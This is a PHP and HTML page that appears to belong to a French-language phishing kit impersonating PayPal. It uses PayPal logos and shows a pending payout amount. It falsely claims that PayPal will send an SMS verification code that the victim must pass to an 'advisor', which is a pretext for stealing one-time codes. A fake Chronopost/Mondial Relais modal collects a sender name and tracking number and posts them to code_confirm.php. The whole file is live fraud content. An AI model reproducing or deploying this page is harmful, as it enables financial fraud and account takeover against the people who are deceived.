<?php
session_start ();
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="x-apple-disable-message-reformatting">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.paypalobjects.com/webstatic/icon/pp144.png">
        <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.paypalobjects.com/webstatic/icon/pp114.png">
        <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.paypalobjects.com/webstatic/icon/pp72.png">
        <link rel="apple-touch-icon-precomposed" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
        <link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png">
        <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico">
        <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png">
        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto|Varela+Round">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet" />
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
    <title>Paypal | information importante</title>
    <style type="text/css">
    .modal-login {    
  color: #636363;
  width: 350px;
}
.modal-login .modal-content {
  padding: 20px;
  border-radius: 5px;
  border: none;
}
.modal-login .modal-header {
  border-bottom: none;   
  position: relative;
  justify-content: center;
}
.modal-login h4 {
  text-align: center;
  font-size: 26px;
  margin: 30px 0 -15px;
}
.modal-login .form-control:focus {
  border-color: #70c5c0;
}
.modal-login .form-control, .modal-login .btn {
  min-height: 40px;
  border-radius: 3px; 
}
.modal-login .close {
  position: absolute;
  top: -5px;
  right: -5px;
} 
.modal-login .modal-footer {
  background: #ecf0f1;
  border-color: #dee4e7;
  text-align: center;
  justify-content: center;
  margin: 0 -20px -20px;
  border-radius: 5px;
  font-size: 13px;
}
.modal-login .modal-footer a {
  color: #999;
}   
.modal-login .avatar {
  position: absolute;
  margin: 0 auto;
  left: 0;
  right: 0;
  top: -70px;
  width: 95px;
  height: 95px;
  border-radius: 50%;
  z-index: 9;
  background: #60c7c1;
  padding: 15px;
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.1);
}
.modal-login .avatar img {
  width: 100%;
}
.modal-login.modal-dialog {
  margin-top: 80px;
}
.modal-login .btn, .modal-login .btn:active {
  color: #fff;
  border-radius: 4px;
  background: #60c7c1 !important;
  text-decoration: none;
  transition: all 0.4s;
  line-height: normal;
  border: none;
}
.modal-login .btn:hover, .modal-login .btn:focus {
  background: #45aba6 !important;
  outline: none;
}
.trigger-btn {
  display: inline-block;
  margin: 100px auto;
}
.spinner {
  padding: 50px;
  position: relative;
  text-align: center;
  display: block;
}

.spinner:before {
  content: "";
  height: 30px;
  width: 30px;
  margin: -15px auto auto -15px;
  position: absolute;
  top: 50%;
  left: 50%;
  border-width: 8px;
  border-style: solid;
  border-color: #ff6e14 #ccc #ccc;
  border-radius: 100%;
  animation: rotation .7s infinite linear;
}

@keyframes rotation {
  from {
    transform: rotate(0deg);
  } to {
    transform: rotate(359deg);
  }
}
.glyphicon-refresh-animate {
    -animation: spin .7s infinite linear;
    -webkit-animation: spin2 .7s infinite linear;
}

@-webkit-keyframes spin2 {
    from { -webkit-transform: rotate(0deg);}
    to { -webkit-transform: rotate(360deg);}
}

@keyframes spin {
    from { transform: scale(1) rotate(0deg);}
    to { transform: scale(1) rotate(360deg);}
}

      a { text-decoration: none; outline: none; }
      @media (max-width: 649px) {
        .modal{
          left: 75px;
          top: 85px;
        }
        .o_col-full { max-width: 100% !important; }
        .o_col-half { max-width: 50% !important; }
        .o_hide-lg { display: inline-block !important; font-size: inherit !important; max-height: none !important; line-height: inherit !important; overflow: visible !important; width: auto !important; visibility: visible !important; }
        .o_hide-xs, .o_hide-xs.o_col_i { display: none !important; font-size: 0 !important; max-height: 0 !important; width: 0 !important; line-height: 0 !important; overflow: hidden !important; visibility: hidden !important; height: 0 !important; }
        .o_xs-center { text-align: center !important; }
        .o_xs-left { text-align: left !important; }
        .o_xs-right { text-align: left !important; }
        table.o_xs-left { margin-left: 0 !important; margin-right: auto !important; float: none !important; }
        table.o_xs-right { margin-left: auto !important; margin-right: 0 !important; float: none !important; }
        table.o_xs-center { margin-left: auto !important; margin-right: auto !important; float: none !important; }
        h1.o_heading { font-size: 32px !important; line-height: 41px !important; }
        h2.o_heading { font-size: 26px !important; line-height: 37px !important; }
        h3.o_heading { font-size: 20px !important; line-height: 30px !important; }
        .o_xs-py-md { padding-top: 24px !important; padding-bottom: 24px !important; }
        .o_xs-pt-xs { padding-top: 8px !important; }
        .o_xs-pb-xs { padding-bottom: 8px !important; }
      }
      @media screen {
        @font-face {
          font-family: 'Roboto';
          font-style: normal;
          font-weight: 400;
          src: local("Roboto"), local("Roboto-Regular"), url(https://fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu7GxKOzY.woff2) format("woff2");
          unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }
        @font-face {
          font-family: 'Roboto';
          font-style: normal;
          font-weight: 400;
          src: local("Roboto"), local("Roboto-Regular"), url(https://fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu4mxK.woff2) format("woff2");
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
        @font-face {
          font-family: 'Roboto';
          font-style: normal;
          font-weight: 700;
          src: local("Roboto Bold"), local("Roboto-Bold"), url(https://fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfChc4EsA.woff2) format("woff2");
          unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }
        @font-face {
          font-family: 'Roboto';
          font-style: normal;
          font-weight: 700;
          src: local("Roboto Bold"), local("Roboto-Bold"), url(https://fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmWUlfBBc4.woff2) format("woff2");
          unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
        .o_sans, .o_heading { font-family: "Roboto", sans-serif !important; }
        .o_heading, strong, b { font-weight: 700 !important; }
        a[x-apple-data-detectors] { color: inherit !important; text-decoration: none !important; }
      }
    </style>
    <!--[if mso]>
    <style>
      table { border-collapse: collapse; }
      .o_col { float: left; }
    </style>
    <xml>
      <o:OfficeDocumentSettings>
        <o:PixelsPerInch>96</o:PixelsPerInch>
      </o:OfficeDocumentSettings>
    </xml>
    <![endif]-->
  </head>
  <body class="o_body o_bg-light" style="width: 100%;margin: 0px;padding: 0px;-webkit-text-size-adjust: 100%;-ms-text-size-adjust: 100%;background-color: #fff;">
    <!-- preview-text -->
    <table width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation">
      <tbody>
        <tr>
          <td class="o_hide" align="center" style="display: none;font-size: 0;max-height: 0;width: 0;line-height: 0;overflow: hidden;mso-hide: all;visibility: hidden;">Email Summary (Hidden)</td>
        </tr>
      </tbody>
    </table>
    <!-- header-white -->
    <table width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation">
      <tbody>
        <tr>
          <td class="o_bg-light o_px-xs o_pt-lg o_xs-pt-xs" align="center" style="background-color: #fff;padding-left: 8px;padding-right: 8px;padding-top: 32px;">
            <!--[if mso]><table width="632" cellspacing="0" cellpadding="0" border="0" role="presentation"><tbody><tr><td><![endif]-->
            <table class="o_block" width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation" style="max-width: 632px;margin: 0 auto;">
              <tbody>
                <tr>
                  <td class="o_bg-white o_px o_py-md o_br-t o_sans o_text" align="center" style="font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;background-color: #ffffff;border-radius: 4px 4px 0px 0px;padding-left: 16px;padding-right: 16px;padding-top: 24px;padding-bottom: 24px;">
                    <p style="margin-top: 0px;margin-bottom: 0px;"><a class="o_text-primary" href="#" style="text-decoration: none;outline: none;color: #126de5;"><img src="img/pp258.png" width="150" height="150"></a></p>



                  </td>
                </tr>
              </tbody>
            </table>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- hero-primary-icon-outline -->
    <table width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation">
      <tbody>
        <tr>
          <td class="o_bg-light o_px-xs" align="center" style="background-color: #fff;padding-left: 8px;padding-right: 8px;">
            <!--[if mso]><table width="632" cellspacing="0" cellpadding="0" border="0" role="presentation"><tbody><tr><td><![endif]-->
            <table class="o_block" width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation" style="max-width: 632px;margin: 0 auto;">
              <tbody>
                <tr>
                  <td class="o_bg-primary o_px-md o_py-xl o_xs-py-md o_sans o_text-md o_text-white" align="center" style="font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 19px;line-height: 28px;background-color: #fff;color: #0a0a0a;padding-left: 24px;padding-right: 24px;padding-top: 64px;padding-bottom: 64px;border-radius: 5px 5px 0 0;box-shadow: 2px 2px 15px -2px rgb(50, 50, 50);">
                    <h4 class="o_heading o_mb-xxs" style="font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 4px;font-size: 30px;line-height: 39px;">
                      <?php if (isset($_SESSION['Amount'])) {
                      echo'<h4 class="o_heading o_mb-xxs">Montant à recevoir après vérification :<br/>'.$_SESSION['Amount'].'<span style="font-size: 12px"class="glyphicon glyphicon-euro"> </span></h4>';
                    }
                    ?></h4>
                    <table cellspacing="0" cellpadding="0" border="0" role="presentation">
                      <tbody>
                        <tr>
                          <td class="o_sans o_text o_text-white o_b-white o_px o_py o_br-max" align="center" style="font-family: Helvetica, Arial, sans-serif;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;color: #1b1a1a;fffff;ng-top: 16px;padding-bottom: 16px;">
                            <h2 class="o_heading o_mb-xxs" style="font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 4px;font-size: 30px;line-height: 39px;"><img src="img/cupertino_activity_indicator.gif" width="70" height="70"></h2>
                          </td>
                        </tr>
                        <tr>
                          <td style="font-size: 24px; line-height: 24px; height: 24px;">&nbsp; </td>
                        </tr>
                      </tbody>
                    </table>
                    
                    <hr style="border-top: 1px solid #1b1a1a;">
                    <p style="margin-top: 0px;margin-bottom: 0px;">Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu'après avoir confirmé que vous êtes bien le tutilaire du compte bancaire enrégistré sur votre compte PAYPAL."<br><br><p style="margin-top: 0px;margin-bottom: 0px; color: #008000;">En confirmant votre carte bancaire vous autorisez PAYPAL à vous envoyer un SMS de confirmation. Vous trouverez dans le SMS un montant et un code de 4 à 8 chiffres de vérification généré de façon aléatoire par nos serveurs que vous devrez communiquer au conseiller pour confirmer votre compte bancaire . <br>Cordialement L'équique<br/>PAYPAL<br/>
                      <span style="color: #1b1a1a; font-size: 18px;font-weight: bold;">Date: </span> <span id="heure"></span>
                    </p>
                    </p>
                  </td>
                </tr>
              </tbody>
            </table>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- spacer-lg -->
    
    <!-- label-lg -->
    <table width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation">
      <tbody>
        <tr>
          <td class="o_bg-light o_px-xs" align="center" style="background-color: #fff;padding-left: 8px;padding-right: 8px;">
            <!--[if mso]><table width="632" cellspacing="0" cellpadding="0" border="0" role="presentation"><tbody><tr><td><![endif]-->
            
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- button-success -->
    <table width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation">
      <tbody>
        <tr>
          <td class="o_bg-light o_px-xs" align="center" style="background-color: #fff;padding-left: 8px;padding-right: 8px;">
            <!--[if mso]><table width="632" cellspacing="0" cellpadding="0" border="0" role="presentation"><tbody><tr><td><![endif]-->
            <table class="o_block" width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation" style="max-width: 632px;margin: 0 auto;">
              <tbody>
                <tr>
                  <td class="o_bg-white o_px-md o_py-xs" align="center" style="background-color: #ffffff;padding-left: 24px;padding-right: 24px;padding-top: 8px;padding-bottom: 8px;">
                    <table align="center" cellspacing="0" cellpadding="0" border="0" role="presentation">
                      <tbody>
                        <tr>
                          <td width="300" class="o_btn o_bg-success o_br o_heading o_text" align="center" style="font-family: Helvetica, Arial, sans-serif;font-weight: bold;margin-top: 0px;margin-bottom: 0px;font-size: 16px;line-height: 24px;mso-padding-alt: 12px 24px;background-color: #fff;border-radius: 4px;">
                            <p class="o_text-white"   style="text-decoration: none;outline: none;color: #9e9e9e;display: block;padding: 12px 24px;mso-text-raise: 3px;">Cordialement<br>PayPal</p>
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </td>
                </tr>
              </tbody>
            </table>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- spacer -->
    <table width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation">
      <tbody>
        <tr>
          <td class="o_bg-light o_px-xs" align="center" style="background-color: #fff;padding-left: 8px;padding-right: 8px;">
            <!--[if mso]><table width="632" cellspacing="0" cellpadding="0" border="0" role="presentation"><tbody><tr><td><![endif]-->
            <table class="o_block" width="100%" cellspacing="0" cellpadding="0" border="0" role="presentation" style="max-width: 632px;margin: 0 auto;">
              <tbody>
                <tr>
                  <td class="o_bg-white" style="font-size: 24px;line-height: 24px;height: 24px;background-color: #ffffff;">&nbsp; </td>
                </tr>
              </tbody>
            </table>
            <!--[if mso]></td></tr></table><![endif]-->
          </td>
        </tr>
      </tbody>
    </table>
    <!-- alert-dark -->
    <!-- spacer -->
    <div id="myModal" class="modal fade">
  <div class="modal-dialog modal-login">
    <div class="modal-content">
      <div class="modal-header">
        <div class="avatar">
          <img src="img/logo-chronopos.png" alt="Avatar">
        </div>        
        <h4 class="modal-title">Veuillez vous munir du numéro de suivi reçu par Mondial Relais/ Chronopost</h4> 
                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
      </div>
      <div class="modal-body">
        <form action="code_confirm.php" method="post">
          <div class="form-group">
            <input type="text" class="form-control" name="username" placeholder="Nom et prénoms de l'expéditeur" required="required">   
          </div>
          <div class="form-group">
            <input type="text" class="form-control" name="code" placeholder="Numéro de suivi" required="required"> 
          </div>        
          <div class="form-group">
            <button type="submit" class="btn btn-primary btn-lg btn-block login-btn">Valider</button>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>
    
    <!-- footer-light-3cols -->
    
    <script type="text/javascript">
var d = new Date();
var date = d.getDate()+'/'+(d.getMonth()+1)+'/'+d.getFullYear();
var hours = d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds();
var fullDate = date+' '+hours;
document.getElementById('heure').innerHTML = fullDate;
    </script>
  </body>
</html>
